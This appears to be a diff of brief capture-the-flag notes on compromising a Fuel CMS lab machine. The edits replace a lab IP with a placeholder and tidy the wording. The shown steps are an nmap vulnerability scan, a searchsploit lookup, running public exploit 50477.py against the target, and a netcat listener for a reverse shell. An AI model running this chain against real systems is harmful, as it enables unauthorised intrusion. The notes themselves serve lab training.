@@ -1,7 +1,7 @@
   
 ![7bf4b0916aefc52bb528163adc713ccf.png](resources/7bf4b0916aefc52bb528163adc713ccf.png)
 
-sudo nmap -v -A -sC --script vuln -p- (IP)  
+sudo nmap -v -A -sC --script vuln -p- (TARGETIP)  
 ![85f055fa45ed3050419142206b149574.png](resources/85f055fa45ed3050419142206b149574.png)
 
 \--> searchsploit Fuel  
@@ -13,11 +13,11 @@ sudo nmap -v -A -sC --script vuln -p- (IP)
 
 ![39a413a69ac28fdf651c14349d2f21af.png](resources/39a413a69ac28fdf651c14349d2f21af.png)
 
-\--> sudo python3 /root/50477.py -u http://10.10.159.98
+\--> sudo python3 /root/50477.py -u http://TARGETIP
 
 ![e1729025d5128a734370291ea9ef4567.png](resources/e1729025d5128a734370291ea9ef4567.png)
 
-open other command promp and  
+Open another command prompt and  
 \--> nc -lnvp 4242
 
 ![421e79cd795e28d587f89104ed9a06cc.png](resources/421e79cd795e28d587f89104ed9a06cc.png)
